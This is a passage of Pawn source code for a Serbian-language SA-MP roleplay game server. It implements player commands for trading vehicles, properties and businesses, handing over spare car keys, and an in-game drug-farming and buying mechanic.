	format( coordsstring, sizeof( coordsstring ), ""col_white"U zameni je ponudjena "col_crvena"firma - %s.\n", BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bName ] );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac od vas trazi "col_crvena"firmu  - %s.\n", BussinesInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bName ] );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, ""col_white"Izaberite da li prihvatate ili odbijate zamenu." );
	
	SPD( id, dialog_ZAMENA_3, DSMSG, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	GlobalProdaja[ id ] = playerid;
	
	SendInfoMessage( playerid, "Uspesno ste ponudili zamenu firmi igracu "col_crvena"%s.", ImeIgraca( id ) );
	SendInfoMessage( playerid, "Vasa firma: "col_crvena"%s "col_white"| Njegova firma: "col_crvena"%s", BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bName ], BussinesInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bName ] );
	return 1;
}

CMD:zamena( playerid, params[] ) {

    new id, moje, njegovo, ponuda[ 128 ], trazi[ 128 ];

    if( sscanf( params, "uii", id, moje, njegovo ) ) {
    
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        SendUsageMessage( playerid, "/zamena [ ID Igraca ] [ Izbor 1 - sta menjate ] [ Izbor 2 - za sta menjate ]" );
	    SendUsageMessage( playerid, "Izbor: 1. Vozilo slot 1 | 2. Vozilo slot 2 | 3. Vozilo slot 3 | 4. Vozilo slot 4" );
	    SendUsageMessage( playerid, "Izbor: 5. Imovina slot 1 | 6. Imovina slot 2 | 7. Imovina slot 3 | 8. Firma" );
		SendInfoMessage( playerid, "Ovom komandom menjate stvari gde su vam prazni slotovi." );
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
    }
    
    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes zameniti sam sa sobom." );
    if( moje < 1 || moje > 8 || njegovo < 1 || njegovo > 8 ) return SendErrorMessage( playerid, "Pogresan izbor broja( 1 - 8 )." );
    if( !IsPlayerNearPlayer( 3.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !" );
    
    if( moje == 1 ) {
        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u slotu 1." );
        format( ponuda, sizeof( ponuda ), "o "col_crvena"vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vID ] ) ) );

        if( PlayerInfo[ id ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ id ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );
		
		GlobalID[ id ] = PlayerInfo[ playerid ][ xVoziloID ][ 0 ];
	}
    else if( moje == 2 ) {
        if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u slotu 2." );
        format( ponuda, sizeof( ponuda ), "o "col_crvena"vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vID ] ) ) );

        if( PlayerInfo[ id ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ id ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );

		GlobalID[ id ] = PlayerInfo[ playerid ][ xVoziloID ][ 1 ];
	}
    else if( moje == 3 ) {
        if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u slotu 3." );
        format( ponuda, sizeof( ponuda ), "o "col_crvena"vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vID ] ) ) );

        if( PlayerInfo[ id ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ id ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );

		GlobalID[ id ] = PlayerInfo[ playerid ][ xVoziloID ][ 2 ];
	}
    else if( moje == 4 ) {
        if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u slotu 4." );
        format( ponuda, sizeof( ponuda ), "o "col_crvena"vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vID ] ) ) );

        if( PlayerInfo[ id ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ id ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ id ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su tom igracu zauzeti." );

		GlobalID[ id ] = PlayerInfo[ playerid ][ xVoziloID ][ 3 ];
	}
    else if( moje == 5 ) {
        if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 1." );
        format( ponuda, sizeof( ponuda ), "a "col_crvena"%s vrednosti %d$", GetPropertyAName( PlayerInfo[ playerid ][ xProperty ][ 0 ] ), II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iPrice ] );

        if( PlayerInfo[ id ][ xProperty ][ 0 ] != -1 && PlayerInfo[ id ][ xProperty ][ 1 ] != -1 && PlayerInfo[ id ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Igrac vec poseduje 3 kuce/stana/vikendice!");

		GlobalID[ id ] = PlayerInfo[ playerid ][ xProperty ][ 0 ];
	}
    else if( moje == 6 ) {
        if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 2." );
        format( ponuda, sizeof( ponuda ), "a "col_crvena"%s vrednosti %d$", GetPropertyAName( PlayerInfo[ playerid ][ xProperty ][ 1 ] ), II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iPrice ] );

        if( PlayerInfo[ id ][ xProperty ][ 0 ] != -1 && PlayerInfo[ id ][ xProperty ][ 1 ] != -1 && PlayerInfo[ id ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Igrac vec poseduje 3 kuce/stana/vikendice!");

        GlobalID[ id ] = PlayerInfo[ playerid ][ xProperty ][ 1 ];
	}
    else if( moje == 7 ) {
        if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemate imovinu u slotu 3." );
        format( ponuda, sizeof( ponuda ), "a "col_crvena"%s vrednosti %d$", GetPropertyAName( PlayerInfo[ playerid ][ xProperty ][ 2 ] ), II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iPrice ] );

        if( PlayerInfo[ id ][ xProperty ][ 0 ] != -1 && PlayerInfo[ id ][ xProperty ][ 1 ] != -1 && PlayerInfo[ id ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Igrac vec poseduje 3 kuce/stana/vikendice!");

        GlobalID[ id ] = PlayerInfo[ playerid ][ xProperty ][ 2 ];
	}
    else if( moje == 8 ) {
        if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Nemate firmu." );
        format( ponuda, sizeof( ponuda ), "a "col_crvena"firma - %s", BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bName ] );

		if( PlayerInfo[ id ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Igrac vec poseduje firmu." );

        GlobalID[ id ] = PlayerInfo[ playerid ][ xFirmaID ];
	}
    
    if( njegovo == 1 ) {
        if( PlayerInfo[ id ][ xVoziloID ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozilo u slotu 1." );
        format( trazi, sizeof( trazi ), "vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ id ][ xVoziloID ][ 0 ] ][ vID ] ) ) );

		if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

		GlobalID_2[ id ] = PlayerInfo[ id ][ xVoziloID ][ 0 ];
	}
    else if( njegovo == 2 ) {
        if( PlayerInfo[ id ][ xVoziloID ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozilo u slotu 2." );
        format( trazi, sizeof( trazi ), "vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ id ][ xVoziloID ][ 1 ] ][ vID ] ) ) );

        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

		GlobalID_2[ id ] = PlayerInfo[ id ][ xVoziloID ][ 1 ];
	}
    else if( njegovo == 3 ) {
        if( PlayerInfo[ id ][ xVoziloID ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozilo u slotu 3." );
        format( trazi, sizeof( trazi ), "vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ id ][ xVoziloID ][ 2 ] ][ vID ] ) ) );

        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

		GlobalID_2[ id ] = PlayerInfo[ id ][ xVoziloID ][ 2 ];
	}
    else if( njegovo == 4 ) {
        if( PlayerInfo[ id ][ xVoziloID ][ 3 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozilo u slotu 4." );
        format( trazi, sizeof( trazi ), "vozilo marke %s", GetVehicleNameEx( GetVehicleModel( VehicleInfo[ PlayerInfo[ id ][ xVoziloID ][ 3 ] ][ vID ] ) ) );

        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
			if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
			else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
		}
		else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
		
		GlobalID_2[ id ] = PlayerInfo[ id ][ xVoziloID ][ 3 ];
	}
    else if( njegovo == 5 ) {
        if( PlayerInfo[ id ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema imovinu u slotu 1." );
        format( trazi, sizeof( trazi ), "%s vrednosti %d$", GetPropertyName( PlayerInfo[ id ][ xProperty ][ 0 ] ), II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iPrice ] );

		if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes 3 kuce/stana/vikendice!");

        GlobalID_2[ id ] = PlayerInfo[ id ][ xProperty ][ 0 ];
	}
    else if( njegovo == 6 ) {
        if( PlayerInfo[ id ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema imovinu u slotu 2." );
        format( trazi, sizeof( trazi ), "%s vrednosti %d$", GetPropertyName( PlayerInfo[ id ][ xProperty ][ 1 ] ), II[ PlayerInfo[ id ][ xProperty ][ 1 ] ][ iPrice ] );

        if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes 3 kuce/stana/vikendice!");

        GlobalID_2[ id ] = PlayerInfo[ id ][ xProperty ][ 1 ];
	}
    else if( njegovo == 7 ) {
        if( PlayerInfo[ id ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Igrac nema imovinu u slotu 3." );
        format( trazi, sizeof( trazi ), "%s vrednosti %d$", GetPropertyName( PlayerInfo[ id ][ xProperty ][ 2 ] ), II[ PlayerInfo[ id ][ xProperty ][ 2 ] ][ iPrice ] );

        if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes 3 kuce/stana/vikendice!");

        GlobalID_2[ id ] = PlayerInfo[ id ][ xProperty ][ 2 ];
	}
    else if( njegovo == 8 ) {
        if( PlayerInfo[ id ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Igrac nema firmu." );
        format( trazi, sizeof( trazi ), "firmu - %s", BussinesInfo[ PlayerInfo[ id ][ xFirmaID ] ][ bName ] );

        if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujete firmu." );

        GlobalID_2[ id ] = PlayerInfo[ id ][ xFirmaID ];
	}

    new coordsstring[ 256 ];

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac "col_crvena"%s "col_white"vam je ponudio zamenu.\n", ImeIgraca( playerid ) );
	strcat( DialogStrgEx, coordsstring );
    format( coordsstring, sizeof( coordsstring ), ""col_white"U zameni je ponudjen%s.\n", ponuda );
	strcat( DialogStrgEx, coordsstring );
	format( coordsstring, sizeof( coordsstring ), ""col_white"Igrac od vas trazi "col_crvena"%s.\n", trazi );
	strcat( DialogStrgEx, coordsstring );
	strcat( DialogStrgEx, ""col_white"Izaberite da li prihvatate ili odbijate zamenu." );
	
	SPD( id, dialog_ZAMENA_1, DSMSG, D_NASLOV, DialogStrgEx, "Prihvati", "Odbij" );
	
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	Ponudjeno[ id ] = moje;
	Trazio[ id ] = njegovo;
	GlobalProdaja[ id ] = playerid;

    SendInfoMessage( playerid, "Uspesno ste ponudili zamenu igracu %s.", ImeIgraca( id ) );
	SendInfoMessage( playerid, "U zameni je ponudjen%s.", ponuda );
	SendInfoMessage( playerid, "U zameni si zatrazio %s.", trazi );

	return 1;
}

CMD:bacikljuc( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == -1 ) return SendErrorMessage( playerid, "Nemas rezervne kljuceve koje bi mogao da bacis." );
	PlayerInfo[ playerid ][ xRezervniKljucevi ] = -1;
    SendInfoMessage( playerid, "Bacio si rezervni kljuc!" );
    return 1;
}

CMD:dajkljuc( playerid, params[] ) {

	new id, vozilo;
	
    if( sscanf( params, "ui", id, vozilo ) ) return SendUsageMessage( playerid, "/dajkljuc [ ID Igraca ] [ slot vozilo(1-4) ]" );
	if( vozilo < 1 || vozilo > 4 ) return SendErrorMessage( playerid, "Pogresan broj slota vozila." );
	
	new slot = vozilo-1;
	
	if( PlayerInfo[ playerid ][ xVoziloID ][ slot ] == -1 ) return SendErrorMessage( playerid, "Nemate vozilo u ovom slotu." );
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes dati kljuc sam sebi!" );
    if( !IsPlayerNearPlayer( 3.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !" );
    if( PlayerInfo[ id ][ xRezervniKljucevi ] != -1 ) return SendErrorMessage( playerid, "Taj igrac vec ima rezervne kljuceve!" );

	PlayerInfo[ id ][ xRezervniKljucevi ] = PlayerInfo[ playerid ][ xVoziloID ][ slot ];
	
	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
	PlayerPlaySound( id, 1052, 0.0, 0.0, 0.0);
	SendInfoMessage( playerid, "Dao si kljuc za auto "col_white"%s", ImeIgraca( id ) );
	SendInfoMessage( id, "Dobio si kljuc za auto od "col_white"%s", ImeIgraca( playerid ) );
	
	format( globalstring, sizeof( globalstring ), "* %s vadi kljuceve svog auta, i daje ih %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	return 1;
}

CMD:droga( playerid, params[] ) {

    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
		SendErrorMessage( playerid, "PD/FBI/CIA nema razloga koristiti ovo!");
		return 1;
	}
	
	new item[32], igrac, slot, slot2, opcija[20], kolicina;
	if( sscanf( params, "s[32] ", item)) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/droga [opcija]");
     	SCM( playerid, BELA, "[Opcije] test, give, view, napravi, posadi, oberi, osusi, buyseeds, buyilegal");
     	SCM( playerid, BELA, "[Opcije] use, show, vremedobranja, mix");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "posadi",true) == 0 ) {
	    if( sscanf( params, "s[32]s[20] ", item, opcija)) {
	        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga posadi [droga]");
			SCM( playerid, BELA, "Droge: Marihuana, Kokain");
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
		}
		if(strcmp(opcija,"marihuana",true) == 0) {
		    new id = PlayerInfo[ playerid ][ xClan ];
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_MARIHUANA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
            if( !IsPlayerInRangeOfPoint( playerid, 200.0, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti na organizacijskoj poljani za sadjenje droge." );
			new Float:x, Float:y, Float:z;
			if( IgracPosadio[ playerid ] == 7 ) return SendErrorMessage( playerid, "Vec si posadio 7 stabiljki marihuane/kokaina.");
			if( Seeds[ playerid ] < 1 ) return SendErrorMessage( playerid, "Da biste zapoceli proizvodnju marihuane,potrebno vam je 1 semenka marihuane!");
			if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT) {

				new plants = -1;
		    	
		    	for( new ix = 1; ix < MAX_PLANTS; ix++ ) {
		            if( DrogaStab[ ix ][ wPlanted ] == 0 ) {
		                plants = ix;
		                break;
					}
				}
				if( plants == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozete da sadite drogu." );
				
				GetPlayerPos( playerid, x, y, z );
				DrogaStab[ plants ][ Plantx ] = x;
		   		DrogaStab[ plants ][ Planty ] = y;
		   		DrogaStab[ plants ][ Plantz ] = z-2;
				DrogaStab[ plants ][ wObjectID ] = CreateDynamicObject( 19473, x, y, z-2, 0.0, 0.0, 96, GetPlayerVirtualWorld( playerid ), -1, -1, 200.0 );
				DrogaStab[ plants ][ wPlanted ] = 1;
				DrogaStab[ plants ][ wType ] = 1;
				DrogaStab[ plants ][ wHoursPassed ] = 0;
				strmid( DrogaStab[ plants ][ wOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
				DrogaStab[ plants ][ wViwo ] = GetPlayerVirtualWorld( playerid );
		  		PlayerPlaySound( playerid, 2000, 0, 0, 0 );
		  		Seeds[ playerid ] -= 1;
		   		ApplyAnimation( playerid, "BOMBER", "BOM_Plant_Loop",4.0,0,0,0,0,0,1 );
		        format( globalstring, sizeof( globalstring ), "%s uzima semenke za marihuanu, i sadi ih.", ImeIgraca( playerid ) );
				PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
				SendInfoMessage( playerid, "Da proveris da li je marihuana spremna za branje kucaj '/droga vremedobranja'." );
				IgracPosadio[ playerid ]++;
		    		
			} else SendErrorMessage( playerid, "Ne mozes posaditi drogu dok si u vozilu!Posadi ju na travi ili ces biti kaznjen!");
		    return 1;
		}
		else if(strcmp(opcija,"kokain",true) == 0) {
		    new id = PlayerInfo[ playerid ][ xClan ];
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_KOKAIN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
            if( !IsPlayerInRangeOfPoint( playerid, 200.0, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti na organizacijskoj poljani za sadjenje droge." );
			new Float:x, Float:y, Float:z;
		    if( IgracPosadio[ playerid ] == 7 ) return SendErrorMessage( playerid, "Vec si posadio 7 stabiljki marihuane/kokaina.");
            if( SeedsK[ playerid ] < 20 ) return SendErrorMessage( playerid, "Da biste zapoceli proizvodnju kokaina,potrebno vam je 20 semenki kokaina!");
			if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT) {
			    new plants = -1;

		    	for( new ix = 1; ix < MAX_PLANTS; ix++ ) {
		            if( DrogaStab[ ix ][ wPlanted ] == 0 ) {
		                plants = ix;
		                break;
					}
				}
				if( plants == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozete da sadite drogu." );
				
		    	GetPlayerPos( playerid, x, y, z);

				DrogaStab[ plants ][ Plantx ] = x;
		  		DrogaStab[ plants ][ Planty ] = y;
		   		DrogaStab[ plants ][ Plantz ] = z-2;
				DrogaStab[ plants ][ wObjectID ] = CreateDynamicObject( 3409, x, y, z-2, 0.0, 0.0, 96, GetPlayerVirtualWorld( playerid ), -1, -1, 200.0 );
				DrogaStab[ plants ][ wPlanted ] = 1;
				DrogaStab[ plants ][ wType ] = 2;
				DrogaStab[ plants ][ wHoursPassed ] = 0;
				strmid( DrogaStab[ plants ][ wOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
				DrogaStab[ plants ][wViwo] = GetPlayerVirtualWorld( playerid );
			    PlayerPlaySound( playerid, 2000, 0, 0, 0 );
				SeedsK[ playerid ] -= 20;
				ApplyAnimation( playerid, "BOMBER","BOM_Plant_Loop",4.0,0,0,0,0,0,1);
		        format( globalstring, sizeof( globalstring ), "%s uzima semenke za kokain, i sadi ih.", ImeIgraca( playerid ) );
				PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
				IgracPosadio[ playerid ]++;
				SendInfoMessage( playerid, "Da proveris da li je kokain spreman za branje kucaj '/droga vremedobranja'." );

			} else SendErrorMessage( playerid, "Ne mozes posaditi drogu dok si u vozilu!Posadi ju na travi ili ces biti kaznjen!");
		    return 1;
		}
		return 1;
	}
	else if( strcmp( item, "buyilegal",true) == 0) {
	    new Float:Randomilegal[10][ 3 ] =
		{
			{ 2790.8262,-2427.4307,13.6329 },
			{ 2790.8269,-2424.9209,13.6329 },
			{ 2784.9187,-2424.9360,13.6344 },
			{ 2784.9187,-2427.4858,13.6344 },
			{ 2784.9370,-2412.4543,13.6344 },
			{ 2784.9192,-2409.0864,13.6344 },
			{ 2790.6887,-2408.5105,13.6330 },
			{ 2790.8250,-2409.8489,13.6329 },
			{ 2790.8250,-2411.8228,13.6329 },
			{ 2796.2822,-2412.6375,13.6316 }
		};
	    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 2834.8999,-2360.7681,26.8931 ) ) return SendErrorMessage( playerid, "Nisi na mestu uzimanja ilegalnih supstanci." );
        if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		if( GetFactionType( playerid ) != ORG_TIP_MAFIJA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		if( sscanf( params, "s[32]s[20]i", item, opcija, kolicina)) {
	        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga buyilegal [stvar] [kolicina]");
			SCM( playerid, BELA, "Stvar: Opium, Methylamin");
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
		}
		if(strcmp(opcija,"opium",true) == 0) {
		    new cena;
		    if(kolicina < 500 || kolicina > 2000) return SendErrorMessage( playerid, "Ne mozete uzeti vise od 2000 a manje od 500 grama opium!");
		    cena = kolicina*2;
		    if( PlayerInfo[ playerid ][ xNovac ] < cena) return SendErrorMessage( playerid, "Nemate dovoljno novca!Jedan gram kosta 2$");
            new poz = random( sizeof( Randomilegal ) );
			VrstaIlegala[ playerid ] = 1;
			KolicinaIlegala[ playerid ] = kolicina;
			Novi_SetPlayerCheckpoint( playerid, Randomilegal[poz][0], Randomilegal[poz][1], Randomilegal[poz][2], 5.0);
			CheckpointStatus[ playerid ] = 11;
			SCM( playerid, SRVBOJA1, "Odi do markera i pokupi svoju robu." );
			return 1;
		}
		else if(strcmp(opcija,"methylamin",true) == 0) {
		    new cena;
		    if( kolicina < 300 || kolicina > 800 ) return SendErrorMessage( playerid, "Ne mozete uzeti vise od 800 a manje od 300 grama methylamina!");
		    cena = kolicina*3;
		    if( PlayerInfo[ playerid ][ xNovac ] < cena ) return SendErrorMessage( playerid, "Nemate dovoljno novca!Jedan gram kosta 3$");
            new poz = random( sizeof( Randomilegal ) );
			VrstaIlegala[ playerid ] = 2;
			KolicinaIlegala[ playerid ] = kolicina;
			Novi_SetPlayerCheckpoint( playerid, Randomilegal[poz][0], Randomilegal[poz][1], Randomilegal[poz][2], 5.0);
			CheckpointStatus[ playerid ] = 11;
			SCM( playerid, SRVBOJA1, "Odi do markera i pokupi svoju robu." );
			return 1;
		}
	    return 1;
	}
	else if( strcmp( item, "buyseeds",true) == 0) {
	    if( !IsPlayerInRangeOfPoint( playerid, 6.0, 870.3927, -24.9189, 63.9863 ) ) return SendErrorMessage( playerid, "Nisi na mestu uzimanja semena." );
	    if( sscanf( params, "s[32]s[20]i", item, opcija, kolicina)) {
	        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/droga buyseeds [droga] [kolicina]");
			SCM( playerid, BELA, "Droge: Marihuana, Kokain");
			SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
		}
		if(strcmp(opcija,"marihuana",true) == 0) {
		    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( OI[ PlayerInfo[ playerid ][ xClan ] ][ oControlType ] != CTIP_MARIHUANA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
		    if( !IsPlayerInRangeOfPoint( playerid, 6.0, 870.3927, -24.9189, 63.9863 ) ) return SendErrorMessage( playerid, "Nisi na mestu uzimanja semena." );
		    new cena;
		    if(kolicina < 1 || kolicina > 1000) return SendErrorMessage( playerid, "Ne mozete uzeti vise od 1000 semenki odjednom!");
